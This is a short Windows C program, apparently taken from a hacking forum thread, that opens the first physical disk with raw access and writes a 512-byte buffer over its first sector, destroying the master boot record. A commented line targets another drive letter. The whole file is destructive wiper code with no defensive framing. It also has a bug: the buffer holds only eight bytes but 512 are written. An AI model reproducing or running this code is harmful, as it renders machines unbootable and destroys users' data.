//http://www.rohitab.com/discuss/topic/41722-mbr-simple-overwrite/

#include <windows.h>
//#include <conio.h>
//#include <stdio.h>

static const char binDump[] = "\xD\xE\xA\xD\xB\xE\xE\xF";

int main(){
    DWORD dw;

    // Use this for a drive to format
    //HANDLE drive = CreateFile("\\\\.\\I:", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  

   // Use this to format your OWN C DRIVE 
   HANDLE drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

if (drive != INVALID_HANDLE_VALUE){
	
  DWORD size = 512;
  
  //printf("Binary file successfuly read!\n");
                    //ok,now lets write the contents of the binary file,to the first sector of the drive

                    if (WriteFile(drive, binDump, size, &dw, 0)){
                        //printf("First sector overritten successfuly!\n");
                    }
  
    CloseHandle(drive);
    //_getch();

return 0;
}
}
